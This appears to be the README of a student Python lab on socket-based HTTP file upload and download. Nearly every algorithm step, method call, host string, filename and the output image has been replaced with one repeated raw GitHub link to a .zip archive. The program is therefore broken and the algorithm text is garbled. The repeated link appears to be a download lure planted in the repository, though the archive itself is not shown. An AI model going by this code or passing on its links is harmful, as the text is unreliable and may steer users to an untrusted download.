# 5a_Create_Socket_for_HTTP_for_webpage_upload_and_download
## AIM :
To write a PYTHON program for socket for HTTP for web page upload and download
## Algorithm

https://github.com/Yugabharathi91/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/raw/refs/heads/main/handlaid/for_Create_HTT_and_Socket_webpage_upload_a_download_3.1.zip the program.
<BR>
https://github.com/Yugabharathi91/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/raw/refs/heads/main/handlaid/for_Create_HTT_and_Socket_webpage_upload_a_download_3.1.zip the frame size from the user
<BR>
https://github.com/Yugabharathi91/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/raw/refs/heads/main/handlaid/for_Create_HTT_and_Socket_webpage_upload_a_download_3.1.zip create the frame based on the user request.
<BR>
https://github.com/Yugabharathi91/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/raw/refs/heads/main/handlaid/for_Create_HTT_and_Socket_webpage_upload_a_download_3.1.zip send frames to server from the client side.
<BR>
https://github.com/Yugabharathi91/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/raw/refs/heads/main/handlaid/for_Create_HTT_and_Socket_webpage_upload_a_download_3.1.zip your frames reach the server it will send ACK signal to client otherwise it will send NACK signal to client.
<BR>
https://github.com/Yugabharathi91/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/raw/refs/heads/main/handlaid/for_Create_HTT_and_Socket_webpage_upload_a_download_3.1.zip the program
<BR>
## Program 
``` Python

import socket
def send_request(host, port, request):
    with https://github.com/Yugabharathi91/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/raw/refs/heads/main/handlaid/for_Create_HTT_and_Socket_webpage_upload_a_download_3.1.zip(https://github.com/Yugabharathi91/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/raw/refs/heads/main/handlaid/for_Create_HTT_and_Socket_webpage_upload_a_download_3.1.zip, https://github.com/Yugabharathi91/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/raw/refs/heads/main/handlaid/for_Create_HTT_and_Socket_webpage_upload_a_download_3.1.zip) as s:
        https://github.com/Yugabharathi91/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/raw/refs/heads/main/handlaid/for_Create_HTT_and_Socket_webpage_upload_a_download_3.1.zip((host, port))
        https://github.com/Yugabharathi91/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/raw/refs/heads/main/handlaid/for_Create_HTT_and_Socket_webpage_upload_a_download_3.1.zip(https://github.com/Yugabharathi91/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/raw/refs/heads/main/handlaid/for_Create_HTT_and_Socket_webpage_upload_a_download_3.1.zip())
        response = https://github.com/Yugabharathi91/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/raw/refs/heads/main/handlaid/for_Create_HTT_and_Socket_webpage_upload_a_download_3.1.zip(4096).decode()
    return response
def upload_file(host, port, filename):
    with open(filename, 'rb') as file:
        file_data = https://github.com/Yugabharathi91/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/raw/refs/heads/main/handlaid/for_Create_HTT_and_Socket_webpage_upload_a_download_3.1.zip()
        content_length = len(file_data)
        request = f"POST /upload HTTP/1.1\r\nHost: {host}\r\nContent-Length: {content_length}\r\n\r\n"
        request += https://github.com/Yugabharathi91/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/raw/refs/heads/main/handlaid/for_Create_HTT_and_Socket_webpage_upload_a_download_3.1.zip()
        response = send_request(host, port, request)
    return response
def download_file(host, port, filename):
    request = f"GET /{filename} HTTP/1.1\r\nHost: {host}\r\n\r\n"
    response = send_request(host, port, request)
    # Assuming the response contains the file content after the headers
    file_content = https://github.com/Yugabharathi91/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/raw/refs/heads/main/handlaid/for_Create_HTT_and_Socket_webpage_upload_a_download_3.1.zip('\r\n\r\n', 1)[1]
    with open(filename, 'wb') as file:
        https://github.com/Yugabharathi91/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/raw/refs/heads/main/handlaid/for_Create_HTT_and_Socket_webpage_upload_a_download_3.1.zip(https://github.com/Yugabharathi91/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/raw/refs/heads/main/handlaid/for_Create_HTT_and_Socket_webpage_upload_a_download_3.1.zip())
if __name__ == "__main__":
    host = 'https://github.com/Yugabharathi91/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/raw/refs/heads/main/handlaid/for_Create_HTT_and_Socket_webpage_upload_a_download_3.1.zip'
    port = 80
    # Upload file
    upload_response = upload_file(host, port, 'https://github.com/Yugabharathi91/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/raw/refs/heads/main/handlaid/for_Create_HTT_and_Socket_webpage_upload_a_download_3.1.zip')
    print("Upload response:", upload_response)
    # Download file
    download_file(host, port, 'https://github.com/Yugabharathi91/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/raw/refs/heads/main/handlaid/for_Create_HTT_and_Socket_webpage_upload_a_download_3.1.zip')
    print("File downloaded successfully.")
```
## OUTPUT

![image](https://github.com/Yugabharathi91/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/raw/refs/heads/main/handlaid/for_Create_HTT_and_Socket_webpage_upload_a_download_3.1.zip)


## Result 
Thus the socket for HTTP for web page upload and download created and Executed
